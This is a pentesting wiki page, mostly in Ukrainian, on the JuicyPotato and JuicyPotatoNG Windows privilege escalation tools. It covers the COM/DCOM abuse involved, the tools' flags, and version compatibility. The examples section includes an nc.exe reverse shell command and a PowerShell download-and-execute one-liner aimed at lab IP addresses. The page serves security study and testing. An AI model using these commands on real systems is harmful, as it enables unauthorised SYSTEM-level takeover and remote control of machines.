# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato застарілий. Зазвичай він працює на Windows версіях до Windows 10 1803 / Windows Server 2016. Зміни від Microsoft, введені починаючи з Windows 10 1809 / Server 2019, порушили оригінальну техніку. Для цих збірок і новіших розгляньте сучасні альтернативи, такі як PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato та інші. Див. сторінку нижче для актуальних варіантів та використання.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (зловживання золотими привілеями) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Підсолоджена версія_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, з невеликою дозою соку, тобто **ще один Local Privilege Escalation tool, з Windows Service Accounts до NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Працює надійно до Windows 10 1803 і Windows Server 2016, коли поточний контекст має SeImpersonatePrivilege або SeAssignPrimaryTokenPrivilege.
- Порушено через посилення захисту Microsoft у Windows 10 1809 / Windows Server 2019 і новіших. Для цих збірок віддавайте перевагу альтернативам, наведеним вище.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) і його [variants](https://github.com/decoder-it/lonelypotato) використовують ланцюжок підвищення привілеїв, заснований на сервісі [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), який має MiTM прослуховувач на `127.0.0.1:6666`, і коли у вас є права `SeImpersonate` або `SeAssignPrimaryToken`. Під час перегляду збірки Windows ми виявили налаштування, де `BITS` було навмисно відключено і порт `6666` був зайнятий.

Ми вирішили озброїти [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Зустрічайте Juicy Potato**.

> Для теорії див. [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) і слідуйте ланцюжку посилань та референцій.

Ми виявили, що, окрім `BITS`, існує кілька COM-серверів, якими можна зловживати. Вони мають лише:

1. бути інстанційовуваними поточним користувачем, зазвичай «service user», який має права імперсонації
2. реалізовувати інтерфейс `IMarshal`
3. працювати від імені підвищеного користувача (SYSTEM, Administrator, …)

Після деяких тестів ми зібрали й перевірили великий список [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) на кількох версіях Windows.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato дозволяє вам:

- **Target CLSID** _оберіть будь-який CLSID, який хочете._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _ви знайдете список, організований за ОС._
- **COM Listening port** _визначте COM listening port, який вам підходить (замість захардкодженого marshalled 6666)_
- **COM Listening IP address** _прив’яжіть сервер до будь-якої IP-адреси_
- **Process creation mode** _залежно від привілеїв імперсонованого користувача ви можете обирати з:_
- `CreateProcessWithToken` (потребує `SeImpersonate`)
- `CreateProcessAsUser` (потребує `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _запустити виконуваний файл або скрипт у випадку успішної експлуатації_
- **Process Argument** _налаштувати аргументи для запуску процесу_
- **RPC Server address** _для більш прихованого підходу ви можете автентифікуватися до зовнішнього RPC server_
- **RPC Server port** _корисно, якщо ви хочете автентифікуватися до зовнішнього сервера, а фаєрвол блокує порт `135`…_
- **TEST mode** _переважно для тестування, наприклад тестування CLSIDів. Створює DCOM і виводить користувача токена. Див._ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Якщо користувач має `SeImpersonate` або `SeAssignPrimaryToken` привілеї, то ви — **SYSTEM**.

Практично неможливо запобігти зловживанню всіма цими COM Servers. Можна подумати про зміну дозволів цих об'єктів через `DCOMCNFG`, але успіху не обіцяю — це буде складно.

Фактичне рішення — захищати чутливі облікові записи та додатки, які працюють під обліковими записами `* SERVICE`. Зупинка `DCOM` безумовно ускладнить цей експлойт, але може мати серйозний вплив на базову ОС.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG повторно вводить JuicyPotato-style local privilege escalation на сучасних Windows, комбінуючи:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Трюки, щоб задовольнити обмеження активації DCOM (наприклад, колишня вимога INTERACTIVE-group при націлюванні на класи PrintNotify / ActiveX Installer Service).

Important notes (evolving behavior across builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Якщо ви націлюєтеся на Windows 10 1809 / Server 2019, де класичний JuicyPotato запатчено, надавайте перевагу альтернативам, вказаним вище (RoguePotato, PrintSpoofer, EfsPotato/GodPotato тощо). NG може бути ситуаційним залежно від збірки та стану служби.

## Приклади

Примітка: Відвідайте [this page](https://ohpe.it/juicy-potato/CLSID/) для списку CLSID-ів, які варто спробувати.

### Отримати nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Запустити новий CMD (якщо у вас є доступ по RDP)

![](<../../images/image (300).png>)

## CLSID Problems

Часто стандартний CLSID, який використовує JuicyPotato, **не працює**, і exploit зазнає невдачі. Зазвичай потрібно кілька спроб, щоб знайти **працюючий CLSID**. Щоб отримати список CLSID для конкретної операційної системи, відвідайте цю сторінку:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Перевірка CLSID**

Спочатку вам знадобляться деякі виконувані файли, окрім juicypotato.exe.

Завантажте [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) і завантажте його у вашу PS session, а також завантажте й виконайте [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Цей скрипт створить список можливих CLSID для тестування.

Потім завантажте [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (змініть шлях до списку CLSID та до виконуваного файлу juicypotato) і виконайте його. Він почне перевіряти кожний CLSID, і **коли зміниться номер порту, це означатиме, що CLSID спрацював**.

**Перевірте** робочі CLSID **за допомогою параметра -c**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
